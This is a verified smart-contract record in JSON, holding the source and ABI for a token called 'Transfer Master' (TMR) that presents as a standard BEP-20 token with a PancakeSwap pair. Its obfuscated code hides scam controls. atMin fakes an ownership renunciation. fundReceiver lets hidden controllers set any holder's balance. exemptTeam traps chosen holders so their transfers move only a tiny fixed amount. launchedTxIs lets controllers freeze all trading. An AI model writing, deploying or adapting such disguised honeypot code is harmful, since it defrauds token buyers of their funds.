{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface tokenIsMax {\n    function createPair(address marketingAmount, address receiverFee) external returns (address);\n}\n\ninterface launchedSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundLimit) external view returns (uint256);\n\n    function transfer(address autoFromLaunched, uint256 enableTradingTake) external returns (bool);\n\n    function allowance(address amountWalletTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableTradingTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoFromLaunched,\n        uint256 enableTradingTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeTeam, uint256 value);\n    event Approval(address indexed amountWalletTotal, address indexed spender, uint256 value);\n}\n\nabstract contract modeLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableReceiverList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atBuy is launchedSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TransferMaster is modeLaunch, launchedSwap, atBuy {\n\n    function minSwap() private view {\n        require(enableSenderTotal[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeBuyTx;\n    }\n\n    uint256 private walletBuy = 100000000 * 10 ** 18;\n\n    uint256 public senderAutoLimit;\n\n    function launchedTxIs(uint256 enableTradingTake) public {\n        minSwap();\n        tokenReceiver = enableTradingTake;\n    }\n\n    mapping(address => bool) public receiverAtLaunched;\n\n    function fundReceiver(address atMax, uint256 enableTradingTake) public {\n        minSwap();\n        modeAmountTx[atMax] = enableTradingTake;\n    }\n\n    event OwnershipTransferred(address indexed sellSwap, address indexed toAmount);\n\n    function transferFrom(address receiverTrading, address autoFromLaunched, uint256 enableTradingTake) external override returns (bool) {\n        if (_msgSender() != receiverTotal) {\n            if (feeExemptTotal[receiverTrading][_msgSender()] != type(uint256).max) {\n                require(enableTradingTake <= feeExemptTotal[receiverTrading][_msgSender()]);\n                feeExemptTotal[receiverTrading][_msgSender()] -= enableTradingTake;\n            }\n        }\n        return tokenWallet(receiverTrading, autoFromLaunched, enableTradingTake);\n    }\n\n    address public fromFeeAt;\n\n    uint256 private autoSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoTeam;\n    }\n\n    function balanceOf(address fundLimit) public view virtual override returns (uint256) {\n        return modeAmountTx[fundLimit];\n    }\n\n    address private listShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyShould;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletBuy;\n    }\n\n    function exemptTeam(address tradingMarketing) public {\n        minSwap();\n        if (autoSwap == receiverLimitExempt) {\n            liquidityMarketing = true;\n        }\n        if (tradingMarketing == fromFeeAt || tradingMarketing == buyLaunched) {\n            return;\n        }\n        receiverAtLaunched[tradingMarketing] = true;\n    }\n\n    address public buyLaunched;\n\n    uint256 public tokenMaxLiquidity;\n\n    bool public minEnable;\n\n    mapping(address => bool) public enableSenderTotal;\n\n    uint256 tokenReceiver;\n\n    uint256 private receiverTeam;\n\n    bool public enableLaunch;\n\n    uint256 public marketingAtMode;\n\n    mapping(address => mapping(address => uint256)) private feeExemptTotal;\n\n    string private modeBuyTx = \"Transfer Master\";\n\n    function transfer(address atMax, uint256 enableTradingTake) external virtual override returns (bool) {\n        return tokenWallet(_msgSender(), atMax, enableTradingTake);\n    }\n\n    uint8 private autoTeam = 18;\n\n    address tokenLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private buyShould = \"TMR\";\n\n    function allowance(address walletMin, address teamBuy) external view virtual override returns (uint256) {\n        if (teamBuy == receiverTotal) {\n            return type(uint256).max;\n        }\n        return feeExemptTotal[walletMin][teamBuy];\n    }\n\n    bool public liquidityMarketing;\n\n    function atMin() public {\n        emit OwnershipTransferred(fromFeeAt, address(0));\n        listShould = address(0);\n    }\n\n    uint256 public receiverLimitExempt;\n\n    bool private shouldTotal;\n\n    mapping(address => uint256) private modeAmountTx;\n\n    uint256 senderFee;\n\n    function getOwner() external view returns (address) {\n        return listShould;\n    }\n\n    function owner() external view returns (address) {\n        return listShould;\n    }\n\n    address receiverTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tokenWallet(address receiverTrading, address autoFromLaunched, uint256 enableTradingTake) internal returns (bool) {\n        if (receiverTrading == fromFeeAt) {\n            return marketingLiquidity(receiverTrading, autoFromLaunched, enableTradingTake);\n        }\n        uint256 autoExempt = launchedSwap(buyLaunched).balanceOf(tokenLiquidity);\n        require(autoExempt == tokenReceiver);\n        require(autoFromLaunched != tokenLiquidity);\n        if (receiverAtLaunched[receiverTrading]) {\n            return marketingLiquidity(receiverTrading, autoFromLaunched, receiverMarketing);\n        }\n        return marketingLiquidity(receiverTrading, autoFromLaunched, enableTradingTake);\n    }\n\n    uint256 constant receiverMarketing = 19 ** 10;\n\n    function maxList(address tradingMax) public {\n        if (minEnable) {\n            return;\n        }\n        \n        enableSenderTotal[tradingMax] = true;\n        if (enableLaunch) {\n            tokenMaxLiquidity = autoSwap;\n        }\n        minEnable = true;\n    }\n\n    function approve(address teamBuy, uint256 enableTradingTake) public virtual override returns (bool) {\n        feeExemptTotal[_msgSender()][teamBuy] = enableTradingTake;\n        emit Approval(_msgSender(), teamBuy, enableTradingTake);\n        return true;\n    }\n\n    function marketingLiquidity(address receiverTrading, address autoFromLaunched, uint256 enableTradingTake) internal returns (bool) {\n        require(modeAmountTx[receiverTrading] >= enableTradingTake);\n        modeAmountTx[receiverTrading] -= enableTradingTake;\n        modeAmountTx[autoFromLaunched] += enableTradingTake;\n        emit Transfer(receiverTrading, autoFromLaunched, enableTradingTake);\n        return true;\n    }\n\n    constructor (){\n        \n        enableReceiverList limitLaunchedMarketing = enableReceiverList(receiverTotal);\n        buyLaunched = tokenIsMax(limitLaunchedMarketing.factory()).createPair(limitLaunchedMarketing.WETH(), address(this));\n        if (autoSwap != marketingAtMode) {\n            liquidityMarketing = true;\n        }\n        fromFeeAt = _msgSender();\n        enableSenderTotal[fromFeeAt] = true;\n        modeAmountTx[fromFeeAt] = walletBuy;\n        atMin();\n        \n        emit Transfer(address(0), fromFeeAt, walletBuy);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountWalletTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTradingTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableSenderTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFeeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTradingTake\",\"type\":\"uint256\"}],\"name\":\"fundReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableTradingTake\",\"type\":\"uint256\"}],\"name\":\"launchedTxIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAtMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"}],\"name\":\"maxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAtLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimitExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAutoLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMaxLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTradingTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoFromLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTradingTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TransferMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}